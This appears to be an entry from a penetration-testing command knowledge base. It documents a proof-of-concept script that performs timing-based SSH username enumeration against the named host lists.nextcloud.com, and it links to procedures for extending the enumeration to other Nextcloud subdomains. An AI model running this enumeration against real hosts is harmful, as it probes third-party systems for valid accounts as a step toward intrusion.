---
id: cmd-004
data: python POC.py lists.nextcloud.com -U usernames.txt
tags:
  - enumeration
  - ssh
type: command
output: >-
  Output showing usernames with response times; identifies non-existing users
  based on low times
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.913Z'
verified: false
validated: true
submitted: true
---
# python-poc-py-username-enumeration-lists-nextcloud-com

## Command

```bash
python POC.py lists.nextcloud.com -U usernames.txt
```

## Description

Performs timing-based username enumeration on lists.nextcloud.com exploiting OpenSSH vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Target (lists.nextcloud.com) | Yes |
| -U | Username file | Yes |

## Examples

### Basic Usage

```bash
python POC.py lists.nextcloud.com -U usernames.txt
```

### Advanced Usage

```bash
python POC.py lists.nextcloud.com -U usernames.txt | grep ">0.047"
```

## Expected Output

Response times; higher values indicate potential valid users.

## Related

- [[commands/python-poc-py-username-enumeration-help-nextcloud-com]]
- [[procedures/Extend-Enumeration-to-Additional-Nextcloud-Subdomains]]
